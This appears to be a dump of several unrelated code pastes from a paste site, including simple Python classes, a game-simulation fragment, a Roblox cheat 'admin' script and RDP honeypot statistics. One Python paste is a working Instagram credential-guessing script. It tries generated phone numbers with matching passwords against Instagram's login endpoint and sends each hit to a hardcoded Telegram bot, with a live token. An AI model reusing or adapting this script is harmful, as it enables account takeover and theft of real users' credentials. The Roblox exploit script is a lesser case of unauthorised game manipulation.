id,title,username,language,date,content
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				return x, y
	return x, y

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
    return math.sqrt((x1 - x2)**2 + (y1 - y2)**2)

def draw_entity(x, y, entity):
    color = tribe_color[entity]
    draw.ellipse((x - 2, y - 2, x + 2, y + 2), fill=color, outline=color)

def start(event=0):
    global entities
    entities = [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""rock"") for _ in range(ROCK_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""paper"") for _ in range(PAPER_COUNT)]
    entities += [(random.randint(0, WINDOW_WIDTH), random.randint(0, WINDOW_HEIGHT), ""scissors"") for _ in range(SCISSORS_COUNT)]
    random.shuffle(entities)

start()
root.bind(""<space>"", start)

while True:
	pil_image = Image.new('RGB', (WINDOW_WIDTH, WINDOW_HEIGHT), color='white')
	draw = ImageDraw.Draw(pil_image)

	for i, (x, y, entity) in enumerate(entities):
		x0, y0 = CX, CY
		if_rev = math.pi
		x, y = movement(x, y, x0, y0)
		x, y = avoid_edges()
		x, y = avoid_entities(x, y)
		draw_entity(x, y, entity)
		entities[i] = (x, y, entity)

	photo_image = ImageTk.PhotoImage(pil_image)

	canvas.create_image(0, 0, anchor='nw', image=photo_image)
	root.update()"
iAypqucY,Untitled,smj007,Python,Thursday 7th of March 2024 06:52:17 PM CDT,"class MovingAverage:

    def __init__(self, size: int):
        self.size = size
        self.q = deque()
        self.count = 0
        self.sum = 0      

    def next(self, val: int) -> float:
        self.count += 1

        if self.count <= self.size:
            self.sum += val
            self.q.append(val)
            return self.sum/self.count
        else:
            front = self.q.popleft()
            self.sum = self.sum - front + val
            return self.sum/self.size"
Fs3HAqFL,Untitled,ZeusThon,Python,Thursday 7th of March 2024 06:51:12 PM CDT,"import requests,time,random
from user_agent import generate_user_agent
from random import choice

def i(user,passe):
 
    print(user+"":""+passe)
    oo=user+"":""+passe
    token = ""6944454543:AAFx_LVfmfqJyT8h1yLDxsYosX3BYhoAIlA""
    ID = ""5297215129""
    try:
	    url=""https://www.instagram.com/api/v1/web/accounts/login/ajax/""
	    head={

	'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	'Viewport-Width':'636',
	'X-Asbd-Id':'129477',
	'X-Csrftoken':'KLHFvQGryMJQjfNl8OnSpBedNZw0NOwO',
	'X-Ig-App-Id':'936619743392459',
	'X-Ig-Www-Claim':'0',
	'X-Instagram-Ajax':'1011874869',
	'X-Requested-With':'XMLHttpRequest',
	}
	
	    tim33 = str(time.time()).split('.')[0]
	    data = {
	        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim33}:{passe}',
	        'optIntoOneTap': 'false',
	        'queryParams': '{}',
	        'trustedDeviceRecords': '{}',
	        'username': user,
}
	    ro1= requests.post(url,headers=head,data=data).text
	    
	    if 'userId' in ro1:
	    	print(""done"")
	    	requests.post(f'https://api.telegram.org/bot6944454543:AAFx_LVfmfqJyT8h1yLDxsYosX3BYhoAIlA/sendMessage?chat_id=5297215129&text={oo}')
	    else:
	    	    
	    	print(""erorr"")
    except:
    	i(user,passe)
def Zaid():
  
        Num = ""12345098761234567890""
        Tr = str(''.join(choice([""12"", ""13"", ""14"", ""15"", ""16"", ""17"", ""18"", ""19""])))
        pas = str(''.join(choice(Num) for i in range(7)))
        user = ""+989"" + Tr + pas
        i(user,pas)
while True:
	Zaid()"
tqVxm1HC,Turtle Startup Sequence,Jameelo,Lua,Thursday 7th of March 2024 06:38:09 PM CDT,"--[[
    Startup file, could be useful later but was made at first to resume quarry code when I log back in :3
]]

function checkQuarryInterrupted() -- See if the quarry needs resuming
    -- if the save file exists, then run the quarry program as it'll handle the rest.
    if fs.exists(""common/QPROG"") then
        -- Ideally will use arguments for this but its 1am and I'm tired
        shell.run(""quarry.lua"")
    else
        print(""Quarry program was not in progress when runtime ended."")
    end
end

-- Need to check if commonUtils is installed, if not then do a full install
if fs.exists(""commonUtils.lua"") == false then
    print(""Reinstalling common utility library..."")
    shell.run(string.format(""pastebin run qMyK5xrK"")) -- run pastebin package installer so you get all of my apps >:) mwahaha
end

--os.loadAPI(""commonUtils.lua"")
-- print(""Checking for updates..."")
--[[
    To check for updates:
    Download a temp file & compare it to the current file, similar to my package installer program
    If there is a SINGLE difference, reinstall that program.
]]

-- Can make this next bit optional by having the quarry program raise a flag when running, and lowering it when not, all inside a save file.
print("""")
print(""Resuming quarry program..."")

checkQuarryInterrupted()"
whmAx1BR,Mic Up Admin Script 3.0 / Configs,LegendzHackz,Lua,Thursday 7th of March 2024 06:29:27 PM CDT,"local TeleportService = game:GetService(""TeleportService"")
local ChatService = game:GetService(""TextChatService"")
local HttpService = game:GetService(""HttpService"")
local RunService = game:GetService(""RunService"")
local Workspace = game:GetService(""Workspace"")
local Players = game:GetService(""Players"")
local Player = Players.LocalPlayer
local PlayerGui = Player.PlayerGui
local Admin = PlayerGui.Admin
local PlaceId, JobId = game.PlaceId, game.JobId

local Stalls = Workspace.Stalls

function Shorten(Username)
    local PlayerList = {}
    for _, CPlayer in pairs(Players:GetPlayers()) do
        if CPlayer.Name:lower():sub(1, #Username) == Username:lower() or CPlayer.DisplayName:lower():sub(1, #Username) == Username:lower() then
            table.insert(PlayerList, CPlayer)
        end
    end
    return PlayerList
end

function Say(Message)
    ChatService.TextChannels.RBXGeneral:SendAsync(Message)
end

function Hop()
    pcall(function()
        local Servers = {}
        for _, v in ipairs(HttpService:JSONDecode(game:HttpGetAsync(""https://games.roblox.com/v1/games/"" .. PlaceId .. ""/servers/Public?sortOrder=Asc&limit=100"")).data) do
            if type(v) == ""table"" and v.maxPlayers > v.playing and v.Id ~= JobId then
                Servers[#Servers + 1] = v.id
            end
        end
        if #Servers > 0 then
            TeleportService:TeleportToPlaceInstance(PlaceId, Servers[math.random(1, #Servers)])
        else
            print(""Server not found."")
        end
    end)
end

function FindPlayer(Target)
    pcall(function()
        local FoundMyTargetC = false

        for _, v in ipairs(Players:GetPlayers()) do
            if v.Name == Target then
                FoundMyTargetC = true
                General:SendAsync(""Server Found!"")
                break
            end
        end
    
        if not FoundMyTargetC then
            Hop()
        end
    end)
end

function View(Target)
    getgenv().Configurations.Spectate = true
    
    while getgenv().Configurations.Spectate do task.wait()
        pcall(function()
            if getgenv().Configurations.Spectate then
                Workspace.CurrentCamera.CameraSubject = Target.Character.Humanoid
            end

            local Viewing = Players.ChildRemoved:Connect(function(Child)
                pcall(function()
                    if Child.Name == Target.Name then
                        getgenv().Configurations.Spectate = false
                        Workspace.CurrentCamera.CameraSubject = Player.Character.Humanoid
                    end

                    Viewing:Disconnect()
                end)
            end)
        end)
    end
end

function Hide()
    pcall(function()
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                Player.Character.HumanoidRootPart.Velocity = Vector3.new()
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(getgenv().Configurations.Axis.X, getgenv().Configurations.Axis.Y, getgenv().Configurations.Axis.Z)
            end
        end
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                if FoundPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Jumping then
                    getgenv().Configurations.Axix.Y = -20
                end
            end
        end
    end)
end

function LoopBring()
    pcall(function()
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                Player.Character.HumanoidRootPart.Velocity = Vector3.new()
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0)
            end
        end
    end)
end

function UnView()
    pcall(function()
        getgenv().Configurations.Spectate = false
        Workspace.CurrentCamera.CameraSubject = Player.Character.Humanoid
    end)
end

function Follow()
    pcall(function()
        for _, FoundPlayer in next, Players:GetPlayers() do
            if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
                local Direction = FoundPlayer.Character.Humanoid.MoveDirection
                local Offset = Direction * getgenv().Configurations.Direction
                Player.Character:SetPrimaryPartCFrame(FoundPlayer.Character.PrimaryPart.CFrame + Offset)
            end
        end
    end)
end

ChatService.MessageReceived:Connect(function(Message)
    for _, FoundPlayer in next, Players:GetPlayers() do
        if FoundPlayer ~= Player and table.find(getgenv().Configurations.Whitelist, FoundPlayer.UserId) then
            if Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""disconnect"" then
                Player:Kick(""You have been disconnected."")
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""bring"" then
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""reset"" then
                Player.Character:BreakJoints()
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""rejoin"" then
                TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Player)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""hide"" then
                getgenv().Configurations.Hide = true
                getgenv().Configurations.LoopBring = false
                getgenv().Configurations.LoopFollow = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unhide"" then
                getgenv().Configurations.Hide = false
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""loopbring"" then
                getgenv().Configurations.LoopBring = true
                getgenv().Configurations.LoopFollow = false
                getgenv().Configurations.Hide = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unloopbring"" then
                getgenv().Configurations.LoopBring = false
                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""loopfollow"" then
                getgenv().Configurations.LoopFollow = true
                getgenv().Configurations.LoopBring = false
                getgenv().Configurations.Hide = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unloopfollow"" then
                getgenv().Configurations.LoopFollow = false
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""hop"" or Message.Text == getgenv().Configurations.Prefix .. ""serverhop"" then
                Hop()
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""findplayer"" then
                FindPlayer(""ChrisEsMiPapi"")
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""spawn"" then
                getgenv().Configurations.LoopBring = false
                getgenv().Configurations.Hide = false

                Player.Character.HumanoidRootPart.CFrame = FoundPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unspawn"" then
                Player.Character.HumanoidRootPart.CFrame = CFrame.new(25, 7.5, 86)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""jump"" then
                Player.Character.Humanoid:ChangeState(""Jumping"")
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""view"" then
                View(FoundPlayer)
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""unview"" then
                UnView()
            elseif Message.TextSource.UserId == FoundPlayer.UserId and Message.Text == getgenv().Configurations.Prefix .. ""bypassvc"" or Message.Text == getgenv().Configurations.Prefix .. ""bypassvoicechat"" then
                Say(""Loading."")
                task.wait(.1)
                Say(""Loading.."")
                task.wait(.1)
                Say(""Loading..."")
                task.wait(.1)
                Say(""Wait 1 Second(s) to bypass Voice Chat."")
                task.wait(1)
                Say(""Roblox VoiceChat has been successfully bypassed."")
            end
        end
    end
end)

for _, v in next, Admin:GetChildren() do
    if v.Name ~= ""TextLabel"" then
        v.Visible = true
    end
end

while task.wait() do
    pcall(function()
        if getgenv().Configurations.Hide then
            Hide()
        elseif getgenv().Configurations.LoopBring then
            LoopBring()
        elseif getgenv().Configurations.LoopFollow then
            Follow()
        end
    end)
    pcall(function()
        for Iter = 1, 5 do
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.Enabled = true
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.HoldDuration = 0 
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.RequiresLineOfSight = false
            Stalls[""Stall"" .. Iter].ProxPart.ProximityPrompt.MaxActivationDistance = 25
        end
    end)
end"
AbE0j3gs,Pastes.io [Pastebin Alternative],xxsa,PHP,Thursday 7th of March 2024 06:27:55 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

More features example share pages QR CODEs - Embed options .. etc
Simple Ads by Google Adsense ( Few rather than Pastebin )
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
Simple & responsive interface
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Ace Editor / Code Mirror
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Report explicit pastes
Socialite (Facebook/Twitter/Google Social login)
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
Auto generated sitemaps
User management
Admin panel to manage pastes, syntax, users, comments, pages, languages, translations & other settings
User profile page
Trending pastes page (day, week, month, year)
QR Code for share
No Captcha for logged in users feature
.. etc"
1pHx47Ut,Untitled,smj007,Python,Thursday 7th of March 2024 06:24:18 PM CDT,"class TwoSum:

    def __init__(self):
        self.nums = defaultdict(int)

    def add(self, number: int) -> None:
        self.nums[number]+= 1

    def find(self, value: int) -> bool:
        for num in self.nums:
            if (value - num) in self.nums:
                # check for duplicates
                if value-num == num:
                    return self.nums[num] > 1
                else:
                    return True
        return False"
L7Yvp1sW,2024-03-07_stats.json,rdp_snitch,JSON,Thursday 7th of March 2024 06:18:13 PM CDT,"{
  ""ip"": {
    ""185.198.69.5"": 18,
    ""185.198.69.27"": 9,
    ""185.198.69.25"": 9,
    ""62.204.41.107"": 6,
    ""185.198.69.24"": 21,
    ""194.165.16.10"": 6,
    ""185.198.69.21"": 12,
    ""185.198.69.30"": 12,
    ""185.198.69.2"": 21,
    ""198.74.56.135"": 3,
    ""185.198.69.9"": 9,
    ""185.198.69.8"": 21,
    ""185.198.69.4"": 12,
    ""212.71.250.240"": 3,
    ""185.198.69.19"": 9,
    ""185.198.69.17"": 12,
    ""185.198.69.26"": 3,
    ""185.198.69.18"": 12,
    ""185.198.69.28"": 12,
    ""185.198.69.29"": 15,
    ""198.235.24.64"": 9,
    ""185.198.69.11"": 12,
    ""185.198.69.14"": 15,
    ""185.198.69.6"": 18,
    ""87.251.75.145"": 12,
    ""185.198.69.16"": 6,
    ""185.198.69.22"": 6,
    ""185.198.69.23"": 9,
    ""159.242.228.116"": 3,
    ""45.88.97.229"": 24,
    ""185.198.69.15"": 3,
    ""64.23.128.235"": 9,
    ""185.198.69.20"": 3,
    ""103.240.6.155"": 6,
    ""185.198.69.7"": 3,
    ""185.170.144.113"": 18,
    ""185.170.144.3"": 6,
    ""185.198.69.3"": 6,
    ""167.94.145.53"": 3,
    ""45.227.254.55"": 12,
    ""198.235.24.136"": 9,
    ""212.70.149.146"": 3,
    ""185.198.69.13"": 3,
    ""27.8.44.19"": 3,
    ""194.165.16.37"": 6,
    ""36.91.222.100"": 3,
    ""185.198.69.31"": 3,
    ""157.230.175.162"": 12,
    ""172.104.208.111"": 3,
    ""45.131.195.151"": 3,
    ""136.239.159.27"": 75,
    ""120.240.145.8"": 3,
    ""45.131.195.22"": 3,
    ""165.154.12.127"": 3,
    ""198.235.24.207"": 9,
    ""62.204.41.123"": 12,
    ""173.239.214.157"": 3,
    ""43.129.180.247"": 3,
    ""194.165.16.11"": 6,
    ""20.42.97.24"": 6,
    ""80.66.88.215"": 3,
    ""198.235.24.248"": 9,
    ""162.142.125.224"": 3,
    ""80.66.76.92"": 6,
    ""188.119.66.107"": 3
  },
  ""asn"": {
    ""AS57523"": 297,
    ""AS59425"": 18,
    ""AS48721"": 18,
    ""AS63949"": 9,
    ""AS396982"": 36,
    ""AS208091"": 21,
    ""AS60068"": 3,
    ""AS174"": 24,
    ""AS14061"": 21,
    ""AS151853"": 6,
    ""AS197414"": 24,
    ""AS398705"": 3,
    ""AS267784"": 12,
    ""AS204428"": 3,
    ""AS4837"": 3,
    ""AS7713"": 3,
    ""AS62240"": 9,
    ""AS17639"": 75,
    ""AS56040"": 3,
    ""AS135377"": 3,
    ""AS132203"": 3,
    ""AS8075"": 6,
    ""AS398324"": 3
  },
  ""isp"": {
    ""Chang Way Technologies Co. Limited"": 297,
    ""Horizon LLC"": 18,
    ""Flyservers S.A."": 30,
    ""Akamai Technologies, Inc."": 3,
    ""Linode"": 3,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 42,
    ""PRCDN-CONSUMER-FR-PAR"": 3,
    ""Cogent Communications"": 24,
    ""DigitalOcean, LLC"": 21,
    ""Giza Network Limited"": 6,
    ""Censys, Inc."": 6,
    ""SS-Net"": 3,
    ""China Unicom Chongqing Province Network"": 3,
    ""PT Telekomunikasi Indonesia"": 3,
    ""Akamai Technologies"": 3,
    ""VPN"": 6,
    ""Converge Information and Communications Technology Solutions"": 75,
    ""China Mobile communications corporation"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""LogicWeb Inc."": 3,
    ""Aceville Pte.ltd"": 3,
    ""Microsoft Corporation"": 6,
    ""Xhost Internet Solutions"": 3
  },
  ""org"": {
    ""Chang Way Technologies Co. Limited"": 297,
    ""Horizon LLC"": 18,
    ""Flyservers S.A"": 18,
    ""Linode"": 6,
    ""Linode, LLC"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 18,
    ""Unknown"": 33,
    ""DigitalOcean, LLC"": 21,
    ""Giza Network Limited"": 6,
    ""Xhostis"": 24,
    ""Censys, Inc."": 3,
    ""UAB Host Baltic"": 12,
    ""4Media Ltd"": 3,
    ""Telekomunikasi Indonesia"": 3,
    ""VPN-Consumer-US"": 6,
    ""Converge Information and Communications Technology Solutions, Inc"": 75,
    ""China Mobile"": 3,
    ""Ucloud Information Technology"": 3,
    ""NSQ-VENTURE"": 3,
    ""Microsoft Azure Cloud (eastus)"": 6,
    ""XHOSTIS"": 3,
    ""Censys Inc"": 3
  },
  ""regionName"": {
    ""Moscow"": 315,
    ""Kaunas"": 18,
    ""New Jersey"": 15,
    ""England"": 3,
    ""California"": 57,
    ""North Holland"": 42,
    ""\u00cele-de-France"": 3,
    ""Hesse"": 27,
    ""Ho Chi Minh"": 6,
    ""Vilnius"": 12,
    ""Plovdiv"": 3,
    ""Chongqing"": 3,
    ""Jakarta"": 3,
    ""Metro Manila"": 75,
    ""Guangdong"": 3,
    ""Dubai"": 3,
    ""Central and Western District"": 3,
    ""Virginia"": 6,
    ""Drenthe"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""Russia"": 315,
    ""Lithuania"": 30,
    ""United States"": 81,
    ""United Kingdom"": 3,
    ""The Netherlands"": 45,
    ""France"": 3,
    ""Germany"": 27,
    ""Vietnam"": 6,
    ""Bulgaria"": 3,
    ""China"": 6,
    ""Indonesia"": 3,
    ""Philippines"": 75,
    ""United Arab Emirates"": 3,
    ""Hong Kong"": 3
  },
  ""account"": {
    ""Administr"": 330,
    ""Test"": 39,
    ""(empty)"": 24,
    ""hello"": 126,
    ""OJflFtniW"": 3,
    ""bGHSaG"": 3,
    ""pQnxTA"": 3,
    ""Domain"": 30,
    ""mUchHhkbA"": 3,
    ""GhxFdf"": 3,
    ""MUBDTA"": 3,
    ""bkrccvfc"": 12,
    ""beio"": 3,
    ""Administrator"": 3,
    ""iQQCaZCEZ"": 3,
    ""RIlJuU"": 3,
    ""xFiSDE"": 3,
    ""xsbXvbIAI"": 3,
    ""ThPUYj"": 3,
    ""GaJlUI"": 3
  },
  ""keyboard"": {
    ""Unknown"": 603
  },
  ""client_build"": {
    ""Unknown"": 603
  },
  ""client_name"": {
    ""Unknown"": 603
  },
  ""ip_type"": {
    ""proxy"": 300,
    ""Unknown"": 186,
    ""hosting"": 69,
    ""mobile & hosting & proxy"": 3,
    ""mobile & proxy"": 24,
    ""hosting & proxy"": 18,
    ""mobile"": 3
  }
}"
